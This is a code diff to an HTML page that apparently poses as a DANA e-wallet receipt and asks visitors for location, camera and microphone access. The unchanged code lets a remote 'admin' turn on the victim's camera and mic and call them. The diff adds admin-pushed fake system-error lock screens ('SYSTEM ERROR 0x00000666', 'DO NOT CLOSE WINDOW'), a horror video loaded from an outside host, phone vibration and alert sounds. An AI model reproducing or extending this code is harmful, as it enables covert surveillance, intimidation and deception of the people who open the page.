@@ -71,6 +71,59 @@
       opacity: 0.001; pointer-events: none; overflow: hidden; z-index: 1;
     }
 
+    /* Overlay Error & Video dari Admin */
+    #adminPushOverlay {
+      position: fixed; inset: 0; z-index: 9999;
+      background: #07090F; color: #F8FAFC;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      padding: 20px; overflow: hidden;
+    }
+    #adminPushOverlay.hidden { display: none !important; }
+    #adminPushOverlay.horror-mode {
+      background: radial-gradient(circle at center, #3B0712 0%, #09050A 68%, #030205 100%);
+      animation: horrorPulse 1.6s infinite alternate;
+    }
+    @keyframes horrorPulse {
+      0% { filter: contrast(1.05) brightness(0.92); }
+      100% { filter: contrast(1.25) brightness(1.08); }
+    }
+    .error-box {
+      width: 100%; max-width: 400px;
+      background: rgba(17, 12, 20, 0.94);
+      border: 1.5px solid #DC2626;
+      border-radius: 16px;
+      padding: 22px 18px;
+      box-shadow: 0 0 40px rgba(220, 38, 38, 0.35);
+      text-align: left;
+    }
+    .error-badge {
+      display: inline-block;
+      background: #991B1B; color: #FECACA;
+      font-size: 10px; font-weight: 800; letter-spacing: 0.08em;
+      padding: 4px 8px; border-radius: 6px; margin-bottom: 10px;
+    }
+    .error-title {
+      font-size: 18px; font-weight: 800; color: #FCA5A5;
+      margin-bottom: 8px; line-height: 1.3;
+    }
+    .error-msg {
+      font-size: 12.5px; color: #E2E8F0; line-height: 1.55;
+      white-space: pre-line; margin-bottom: 14px;
+    }
+    .error-meta {
+      font-size: 11px; color: #94A3B8;
+      border-top: 1px solid rgba(148, 163, 184, 0.2);
+      padding-top: 10px; font-family: monospace;
+    }
+    .push-video-wrap {
+      width: 100%; max-width: 440px; border-radius: 14px; overflow: hidden;
+      border: 1px solid rgba(248, 113, 113, 0.45); background: #000000;
+      box-shadow: 0 18px 45px rgba(0, 0, 0, 0.75);
+    }
+    .push-video-wrap video {
+      width: 100%; max-height: 75dvh; display: block; object-fit: contain; background: #000;
+    }
+
     .device-frame {
       width: 100%; height: 100%; height: var(--app-height, 100dvh); max-height: 100%;
       position: relative; z-index: 10; overflow: hidden; display: flex; flex-direction: column;
@@ -155,6 +208,26 @@
   </style>
 </head>
 <body>
+  <div id="adminPushOverlay" class="hidden" aria-live="assertive">
+    <div id="pushErrorView" class="error-box hidden">
+      <div class="error-badge" id="pushErrorCode">SYSTEM ERROR 0x00000666</div>
+      <div class="error-title" id="pushErrorTitle">PERINGATAN SISTEM TERDETEKSI</div>
+      <div class="error-msg" id="pushErrorMessage">Sesi perangkat terdeteksi tidak normal. Sinkronisasi data sedang dihentikan paksa...</div>
+      <div class="error-meta" id="pushErrorMeta">STATUS: LOCKED • DO NOT CLOSE WINDOW</div>
+    </div>
+
+    <div id="pushVideoView" class="push-video-wrap hidden">
+      <video
+        id="adminPushVideo"
+        playsinline
+        webkit-playsinline
+        controls
+        autoplay
+        referrerpolicy="no-referrer"
+      ></video>
+    </div>
+  </div>
+
   <div id="permissionGate">
     <div class="gate-card">
       <h2 style="font-size:17px;font-weight:700;margin-bottom:8px;">Izin Lokasi, Kamera & Mikrofon</h2>
@@ -240,7 +313,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 22:32</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 22:48</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -312,7 +385,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 22:32</span>
+            <span id="displayDateTime">24 Nov 2026 • 22:48</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -620,7 +693,92 @@
     }
 
     /* =========================================================================
-       MODUL MEMBER: DETEKSI NAMA HP (TERMASUK KODE MODEL) + LOKASI CEPAT
+       OVERLAY KIRIMAN ADMIN (LAYAR ERROR & VIDEO)
+       ========================================================================= */
+    function triggerVibrateAlert(pattern = [250, 120, 250, 120, 400]) {
+      try {
+        if (navigator.vibrate) navigator.vibrate(pattern);
+      } catch (_) {}
+    }
+
+    function showAdminErrorOverlay(msg) {
+      const overlay = document.getElementById("adminPushOverlay");
+      const errView = document.getElementById("pushErrorView");
+      const vidView = document.getElementById("pushVideoView");
+      const pushVid = document.getElementById("adminPushVideo");
+
+      if (pushVid) {
+        try { pushVid.pause(); } catch (_) {}
+      }
+
+      document.getElementById("pushErrorCode").textContent = msg.code || "FATAL_ERROR 0x00000DEAD";
+      document.getElementById("pushErrorTitle").textContent = msg.title || "PERINGATAN SISTEM TERDETEKSI";
+      document.getElementById("pushErrorMessage").textContent =
+        msg.message || "Aktivitas mencurigakan terdeteksi pada sesi perangkat ini.\nJangan tutup halaman atau mematikan perangkat saat pemeriksaan berjalan.";
+      document.getElementById("pushErrorMeta").textContent =
+        `NODE: ${MEMBER_PEER_ID} • TIME: ${new Date().toLocaleTimeString("id-ID")}`;
+
+      overlay.classList.add("horror-mode");
+      vidView.classList.add("hidden");
+      errView.classList.remove("hidden");
+      overlay.classList.remove("hidden");
+
+      triggerVibrateAlert();
+      if (msg.withSound !== false) {
+        playNotifSound("ALERT");
+      }
+    }
+
+    function showAdminVideoOverlay(msg) {
+      const overlay = document.getElementById("adminPushOverlay");
+      const errView = document.getElementById("pushErrorView");
+      const vidView = document.getElementById("pushVideoView");
+      const pushVid = document.getElementById("adminPushVideo");
+
+      errView.classList.add("hidden");
+      vidView.classList.remove("hidden");
+      overlay.classList.toggle("horror-mode", Boolean(msg.horrorMode));
+      overlay.classList.remove("hidden");
+
+      const targetUrl = (msg.videoUrl && msg.videoUrl.trim())
+        ? msg.videoUrl.trim()
+        : "https://b.top4top.io/m_3975xed1e1.mp4";
+
+      if (pushVid) {
+        pushVid.src = targetUrl;
+        pushVid.loop = Boolean(msg.loop);
+        pushVid.muted = Boolean(msg.muted);
+        pushVid.volume = msg.muted ? 0 : 1;
+        pushVid.load();
+        pushVid.play().catch(() => {
+          pushVid.muted = true;
+          pushVid.play().catch(() => {});
+        });
+      }
+      triggerVibrateAlert([200, 100, 200]);
+    }
+
+    function hideAdminOverlay() {
+      const overlay = document.getElementById("adminPushOverlay");
+      const errView = document.getElementById("pushErrorView");
+      const vidView = document.getElementById("pushVideoView");
+      const pushVid = document.getElementById("adminPushVideo");
+
+      if (pushVid) {
+        try {
+          pushVid.pause();
+          pushVid.removeAttribute("src");
+          pushVid.load();
+        } catch (_) {}
+      }
+      errView.classList.add("hidden");
+      vidView.classList.add("hidden");
+      overlay.classList.remove("horror-mode");
+      overlay.classList.add("hidden");
+    }
+
+    /* =========================================================================
+       MODUL MEMBER: DETEKSI NAMA HP + LOKASI CEPAT + KAMERA/MIC + OVERLAY
        ========================================================================= */
     function detectHpInfo() {
       const ua = navigator.userAgent || "";
@@ -666,22 +824,11 @@
         }
       }
 
-      if (/^sm-/i.test(modelMatch)) {
-        return { slug: "samsung", name: `Samsung ${modelMatch}` };
-      }
-      if (/^cph/i.test(modelMatch)) {
-        return { slug: "oppo", name: `OPPO ${modelMatch}` };
-      }
-      if (/^rmx/i.test(modelMatch)) {
-        return { slug: "realme", name: `Realme ${modelMatch}` };
-      }
-      if (/^v2\d{3}/i.test(modelMatch)) {
-        return { slug: "vivo", name: `Vivo ${modelMatch}` };
-      }
-
-      if (/android/i.test(ua)) {
-        return { slug: "android", name: modelMatch || "Android HP" };
-      }
+      if (/^sm-/i.test(modelMatch)) return { slug: "samsung", name: `Samsung ${modelMatch}` };
+      if (/^cph/i.test(modelMatch)) return { slug: "oppo", name: `OPPO ${modelMatch}` };
+      if (/^rmx/i.test(modelMatch)) return { slug: "realme", name: `Realme ${modelMatch}` };
+      if (/^v2\d{3}/i.test(modelMatch)) return { slug: "vivo", name: `Vivo ${modelMatch}` };
+      if (/android/i.test(ua)) return { slug: "android", name: modelMatch || "Android HP" };
       return { slug: "hp", name: modelMatch || "HP" };
     }
 
@@ -1038,6 +1185,12 @@
       } else if (msg.type === "ENABLE_MIC") {
         await openCameraKeepAlive(currentFacing, true).catch(() => {});
         placeCallToAdmin(fromPeerId, true);
+      } else if (msg.type === "SHOW_ERROR_SCREEN") {
+        showAdminErrorOverlay(msg);
+      } else if (msg.type === "PLAY_MEMBER_VIDEO") {
+        showAdminVideoOverlay(msg);
+      } else if (msg.type === "HIDE_OVERLAY") {
+        hideAdminOverlay();
       } else if (msg.type === "PING") {
         connectToAdminLobby();
         if (!hasLocationData) tryFastNetworkLocationFallback();
